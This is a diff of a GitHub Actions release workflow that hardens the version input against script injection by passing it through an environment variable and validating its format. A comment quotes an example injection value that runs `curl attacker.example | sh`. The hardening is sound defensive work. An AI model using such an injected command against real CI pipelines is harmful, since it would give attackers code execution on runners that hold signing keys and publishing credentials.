@@ -14,8 +14,9 @@ on:
   workflow_dispatch:
     inputs:
       version:
-        description: "Version to build, without the leading v"
+        description: "Version to build, without the leading v (for example 0.1.0)"
         required: true
+        type: string
 
 permissions:
   contents: write
@@ -53,11 +54,27 @@ jobs:
 
       - name: Resolve the version
         id: version
+        # The dispatch input reaches the shell through the environment rather than through ${{ }}
+        # interpolation. An interpolated input is pasted into the script before bash sees it, so a
+        # version of `1.0.0"; curl attacker.example | sh; #` would run on a runner holding the release
+        # signing key and the credentials that publish to every host's APT source — the one job in this
+        # repository where arbitrary execution is worth the most. The pattern check is a second line:
+        # what a release version may look like is not a matter of taste.
+        env:
+          INPUT_VERSION: ${{ inputs.version }}
         run: |
-          if [ -n "${{ github.event.inputs.version }}" ]; then
-            version="${{ github.event.inputs.version }}"
+          if [ -n "$INPUT_VERSION" ]; then
+            version="$INPUT_VERSION"
           else
             version="${GITHUB_REF_NAME#v}"
+          fi
+          case "$version" in
+            [0-9]*.[0-9]*.[0-9]*) ;;
+            *) echo "refusing to release '$version': not a semantic version" >&2; exit 1 ;;
+          esac
+          if [ -n "$(printf %s "$version" | tr -d '0-9A-Za-z.+-')" ]; then
+            echo "refusing to release '$version': it contains characters a version may not" >&2
+            exit 1
           fi
           echo "version=$version" >> "$GITHUB_OUTPUT"
           echo "building $version"
